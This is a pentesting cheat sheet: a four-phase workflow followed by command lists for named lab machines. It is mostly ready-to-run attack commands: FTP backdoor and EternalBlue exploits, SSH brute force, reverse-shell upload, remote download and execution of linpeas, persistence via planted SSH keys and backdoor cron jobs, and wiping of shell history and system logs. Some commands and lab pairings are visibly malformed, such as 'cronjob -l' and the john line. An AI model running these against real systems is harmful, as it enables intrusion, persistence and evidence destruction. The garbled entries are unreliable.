## Pentesting Workflow Steps

Refine your pentest engagements by following these core steps: Reconnaissance, Exploitation (Getting Shell), Post-Exploitation, and Cleanup (Clearing Fingerprints). Each phase includes typical tasks, tools, commands, and best practices.

---

### Step 1: Reconnaissance

**Objective**: Map the target’s attack surface.

1. **Passive Recon**

   * WHOIS lookup: `whois target.com`
   * DNS enumeration: `gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1m.txt`
   * Certificate transparency: `curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value'`
   * Public code search: GitHub token leaks.

2. **Active Recon**

   * Ping sweep: `fping -a -g 10.10.2.0/24`
   * Service discovery: `nmap -sn 10.10.2.0/24`
   * Port scan: `nmap -sS -Pn target`
   * Banner grabbing: `nc target 80`

---

### Step 2: Exploitation (Getting Shell)

**Objective**: Gain initial access.

1. **Web Exploits**

   * Directory busting: `gobuster dir -u http://target/ -w wordlist.txt`
   * File upload: upload PHP shell (`php-reverse-shell.php`).

2. **Service Exploits**

   * FTP backdoor: `echo ":)" | nc target 21 && nc target 6200`
   * SSH brute-force: `hydra -l user -P rockyou.txt ssh://target`

3. **Metasploit**

   ```bash
   msfconsole
   use exploit/unix/ftp/vsftpd_234_backdoor
   set RHOSTS target
   exploit
   ```

---

### Step 3: Post-Exploitation

**Objective**: Escalate privileges and maintain access.

1. **Shell Stabilization**

   ```bash
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   Ctrl+Z; stty raw -echo; fg; export TERM=xterm
   ```

2. **Privilege Escalation**

   * LinPEAS: `./linpeas.sh`
   * SUID checks: `find / -perm -4000 -type f`
   * Manual sudo checks: `sudo -l`

3. **Persistence**

   * SSH key addition: `echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys`
   * Cron job: `(crontab -l; echo "* * * * * /path/to/backdoor") | crontab -`

---

### Step 4: Cleanup (Clearing Fingerprints)

**Objective**: Remove evidence of activity.

1. **Shell history**

   ```bash
   history -c && > ~/.bash_history
   ```

2. **Log tampering**

   ```bash
   > /var/log/auth.log
   > /var/log/syslog
   ```

3. **Artifact removal**

   * Remove uploaded shells: `rm /var/www/html/shell.php`
   * Delete tools: `rm ~/linpeas.sh`

---

*This streamlined workflow ensures structured operations from discovery to cleanup.*

---

## VM-Specific Command Cheat Sheets

Summarized most common commands encountered in popular TryHackMe walkthroughs.

### RootMe

```bash
nmap -sV 10.10.2.71
gobuster dir -u http://10.10.2.71/sitemap -w common.txt
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
nc -lvnp 1234
python3 -c 'import pty; pty.spawn("/bin/bash")'
find / -perm -4000 -type f
python -c 'import os; os.execl("/bin/sh","sh","-p")'
```

### Basic Pentesting

```bash
nmap -sS -sC -A -p- <TARGET_IP>
gobuster dir -u http://<TARGET_IP>/ -w raft-small-words.txt
enum4linux -a <TARGET_IP>
hydra -l jan -P rockyou.txt ssh://<TARGET_IP>
wget http://<YOUR_IP>:8000/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
john --wordlist=rockyou.txt ssh2john id_rsa
```

### Mr Robot

```bash
nmap -sC -sV -oA scans/mrrobot 10.10.10.5
gobuster dir -u http://10.10.10.5 -w common.txt -t 50
searchsploit sudo 1.8.27
sudo -l
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Overpass

```bash
nmap -sV -p- 10.10.2.15
gobuster dir -u http://10.10.2.15/ -w medium.txt
docker ps -a
docker exec -it <container_id> /bin/sh
```

### Blue (EternalBlue)

```bash
nmap -p445 --script smb-vuln-ms17-010 10.10.10.3
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOST 10.10.10.3; exploit"
rdesktop 10.10.10.3
enum4linux -a 10.10.10.3
```

### Kenobi

```bash
nmap -sC -sV 10.10.2.11
gobuster dir -u http://10.10.2.11/ -w big.txt
ffuf -u http://10.10.2.11/FUZZ -w common.txt
hydra -l kenobi -P passwords.txt ssh://10.10.2.11
```

### Vulnversity

```bash
nmap -sC -sV 10.10.2.12
enum4linux -a 10.10.2.12
smbclient -L //10.10.2.12 -N
docker images
docker run -v /:/mnt alpine chroot /mnt /bin/sh
```

### Timelapse

```bash
nmap -sV 10.10.2.20
gobuster dir -u http://10.10.2.20/ -w small.txt
pspy -f /usr/bin/pspy &
cronjob -l
tail -f /var/log/syslog
```

*Keep this cheat sheet handy for quick reference during engagements.*
